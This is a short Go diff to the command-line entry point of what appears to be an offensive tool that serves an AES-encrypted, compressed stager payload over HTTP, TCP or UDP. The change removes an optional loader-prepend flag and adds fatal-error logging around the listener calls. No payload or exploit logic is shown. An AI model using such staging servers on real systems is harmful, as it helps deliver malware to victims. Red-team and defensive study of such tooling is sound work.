@@ -12,7 +12,6 @@ func main() {
 	stagerPath := flag.String("stager", "", "path to the stager file to serve")
 	port := flag.String("port", "8080", "port to serve the stager file on")
 	keyStr := flag.String("key", "my_secret_key", "key to encrypt the stager file")
-	loaderPath := flag.String("loader", "", "optional path to loader.bin to prepend before encrypted payload")
 	listenerType := flag.String("type", "http", "listener type: http, tcp, or udp")
 	flag.Parse()
 
@@ -26,11 +25,11 @@ func main() {
 
 	switch *listenerType {
 	case "http":
-		listener.HTTPAESCompressedListener(*stagerPath, *port, *keyStr, true, *loaderPath)
+		logging.Fatal(listener.HTTPAESCompressedListener(*stagerPath, *port, *keyStr, true))
 	case "tcp":
-		listener.TCPAESCompressedListener(*stagerPath, *port, *keyStr, true, *loaderPath)
+		logging.Fatal(listener.TCPAESCompressedListener(*stagerPath, *port, *keyStr, true))
 	case "udp":
-		listener.UDPAESCompressedListener(*stagerPath, *port, *keyStr, true, *loaderPath)
+		logging.Fatal(listener.UDPAESCompressedListener(*stagerPath, *port, *keyStr, true))
 	default:
 		logging.Fatalf("Unknown listener type: %s (supported: http, tcp, udp)", *listenerType)
 	}
